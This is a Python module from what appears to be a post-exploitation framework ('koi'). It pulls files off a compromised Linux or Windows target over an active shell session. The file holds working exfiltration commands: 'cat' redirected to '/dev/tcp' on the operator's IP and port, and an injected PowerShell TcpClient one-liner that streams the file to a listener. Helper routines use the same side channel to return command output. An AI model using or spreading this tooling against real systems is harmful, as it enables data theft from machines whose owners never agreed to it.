from __future__ import annotations
import os
import posixpath
import re
import select
import socket
import threading
import time
import uuid
from koi.modules.blueprint import KoiModule

_PS_PROMPT = re.compile(r'^PS\s+\S+>\s*')


def _remote_basename(path: str) -> str:
    import ntpath
    """Return the filename portion of a remote path (Linux or Windows)."""
    return ntpath.basename(path) or posixpath.basename(path)


class DownloadModule(KoiModule):
    name = "download"
    description = "Download a file from the target via a dedicated TCP connection."
    usage = "download <id> <remote_path> [-o <local_path>]"
    category = "File transfer"
    platform = ["linux", "windows_ps"]
    arguments = [
        {"flags": ["remote_path"], "help": "Path of the file on the remote target"},
        {"flags": ["-o", "--output"], "default": None, "help": "Local output path"},
    ]

    def _get_local_ip(self) -> str:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect((self.session.addr[0], 80))
            return s.getsockname()[0]
        finally:
            s.close()

    # Linux helpers

    def _exec_clean(self, cmd: str, timeout: float = 10.0) -> str:
        """Run a Linux command and collect its stdout via a side TCP channel."""
        local_ip = self._get_local_ip()
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", 0))
        srv.listen(1)
        srv.settimeout(timeout)
        port = srv.getsockname()[1]

        self.exec(f"( {cmd} ) > /dev/tcp/{local_ip}/{port}", timeout=timeout)

        try:
            conn, _ = srv.accept()
            data = b""
            while chunk := conn.recv(4096):
                data += chunk
            conn.close()
            return data.decode("utf-8", errors="replace").strip()
        except socket.timeout:
            return ""
        finally:
            srv.close()

    # Windows helpers

    def _win_query(self, ps_expr: str, timeout: float = 10.0) -> str:
        """
        Evaluate a PowerShell expression on the remote Windows target and return
        its string output.

        For plain (non-upgraded) sessions the result is read back inline via a
        sentinel marker.  For upgraded ConPtyShell sessions the output is a raw
        VT100 stream, so we redirect the result over a fresh side-channel TCP
        socket instead (same technique as _exec_clean for Linux).
        """
        if self.session.upgraded:
            return self._win_query_sidechannel(ps_expr, timeout)

        sentinel = uuid.uuid4().hex
        marker = f"__KOI_{sentinel}__"

        if self.session.os_type == "windows_ps":
            cmd = f"({ps_expr}); '{marker}'"
        else:
            inner = f"({ps_expr}); '{marker}'"
            cmd = f'powershell -NoProfile -NonInteractive -c "{inner}"'

        eol = self.session.eol
        enc = self.session.encoding
        self.session.conn.sendall((cmd + eol).encode(enc))

        buf = b""
        deadline = time.monotonic() + timeout
        lines: list[str] = []

        while True:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                break
            r, _, _ = select.select([self.session.conn], [], [], min(remaining, 0.1))
            if not r:
                continue
            chunk = self.session.conn.recv(4096)
            if not chunk:
                break
            buf += chunk
            while b"\n" in buf:
                raw, buf = buf.split(b"\n", 1)
                text = raw.decode(enc, errors="replace").strip("\r\n ")
                text = _PS_PROMPT.sub("", text).strip()
                if not text or "Write-Host" in text:
                    continue
                if marker in text:
                    return lines[-1] if lines else ""
                lines.append(text)

        return lines[-1] if lines else ""

    def _win_query_sidechannel(self, ps_expr: str, timeout: float = 10.0) -> str:
        """
        Variant of _win_query for upgraded (ConPtyShell) sessions.
        Opens a local TCP socket and asks PowerShell to push its result there,
        bypassing the VT100 stream entirely.
        """
        local_ip = self._get_local_ip()
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", 0))
        srv.listen(1)
        srv.settimeout(timeout)
        port = srv.getsockname()[1]

        ps_cmd = (
            f"$_r=({ps_expr})|Out-String;"
            f"$_c=New-Object Net.Sockets.TcpClient('{local_ip}',{port});"
            f"$_s=$_c.GetStream();"
            f"$_b=[Text.Encoding]::UTF8.GetBytes($_r.Trim());"
            f"$_s.Write($_b,0,$_b.Length);"
            f"$_s.Flush();$_c.Close()"
        )
        self.session.conn.sendall((ps_cmd + "\r\n").encode(self.session.encoding))

        try:
            conn, _ = srv.accept()
            data = b""
            while chunk := conn.recv(4096):
                data += chunk
            conn.close()
            return data.decode("utf-8", errors="replace").strip()
        except socket.timeout:
            return ""
        finally:
            srv.close()

    def run(self) -> None:
        remote_path = self.args.remote_path
        local_path  = self.args.output or _remote_basename(remote_path)
        local_ip    = self._get_local_ip()
        os_type     = self.session.os_type

        # Step 1 : existence check
        with self.spinner("Checking if file exists…"):
            if os_type == "linux":
                token_ok  = uuid.uuid4().hex
                token_err = uuid.uuid4().hex
                result = self.exec(
                    f"test -f {remote_path} && echo {token_ok} || echo {token_err}"
                )
                exists = result.stdout.count(token_err) < 2
            else:
                raw = self._win_query(f"(Test-Path '{remote_path}').ToString()")
                exists = raw.lower() == "true"

        if not exists:
            self.err(f"Remote file not found: {remote_path}")
            return

        # Step 2 : file size
        with self.spinner("Getting file size…"):
            if os_type == "linux":
                size_str = self._exec_clean(f"wc -c < {remote_path}")
                try:
                    remote_size = int(size_str.split()[0])
                except (ValueError, IndexError):
                    remote_size = None
            else:
                size_raw = self._win_query(f"(Get-Item '{remote_path}').Length")
                try:
                    remote_size = int(size_raw.strip())
                except (ValueError, IndexError):
                    remote_size = None

        # Step 3 : open local TCP listener
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", 0))
        srv.listen(1)
        srv.settimeout(10)
        port = srv.getsockname()[1]

        received: list[bytes] = []
        error:    list[str]   = []

        def _recv():
            try:
                conn, _ = srv.accept()
                buf = b""
                bar = self.ui.ProgressBar(total=remote_size or 0)
                while True:
                    chunk = conn.recv(65536)
                    if not chunk:
                        break
                    buf += chunk
                    bar.update(len(buf))
                bar.done()
                received.append(buf)
                conn.close()
            except Exception as exc:
                error.append(str(exc))
            finally:
                srv.close()

        t = threading.Thread(target=_recv, daemon=True)
        t.start()

        self.status(
            f"Downloading {remote_path}"
            + (f" ({remote_size} bytes)" if remote_size else "")
            + "…"
        )

        # Step 4 : trigger remote transfer
        if os_type == "linux":
            self.exec(
                f"cat {remote_path} > /dev/tcp/{local_ip}/{port}",
                timeout=30,
            )
        else:
            ps_cmd = (
                f"$_c=New-Object Net.Sockets.TcpClient('{local_ip}',{port});"
                f"$_s=$_c.GetStream();"
                f"$_f=[IO.File]::OpenRead('{remote_path}');"
                f"$_b=New-Object byte[] 65536;"
                f"while(($_n=$_f.Read($_b,0,$_b.Length))-gt 0){{$_s.Write($_b,0,$_n)}};"
                f"$_f.Close();$_s.Flush();$_c.Close()"
            )

            if self.session.upgraded:
                self.session.conn.sendall((ps_cmd + "\r\n").encode(self.session.encoding))
                time.sleep(0.3)
                r, _, _ = select.select([self.session.conn], [], [], 1.0)
                if r:
                    self.session.conn.recv(4096)
            elif os_type == "windows_ps":
                self.sendline(ps_cmd)
            else:
                escaped = ps_cmd.replace('"', '\\"')
                self.sendline(f'powershell -NoProfile -NonInteractive -c "{escaped}"')

        t.join(timeout=30)
        print()

        # Step 5 : write to disk
        if error:
            self.err(f"Transfer failed: {error[0]}")
            return
        if not received:
            self.err("No data received — transfer timed out.")
            return

        raw = received[0]
        try:
            with open(local_path, "wb") as f:
                f.write(raw)
        except OSError as exc:
            self.err(f"Could not write {local_path}: {exc}")
            return

        self.box("Download complete", {
            "remote path": remote_path,
            "local path":  os.path.abspath(local_path),
            "size":        f"{len(raw)} bytes  ({len(raw)/1024:.1f} KB)",
        })
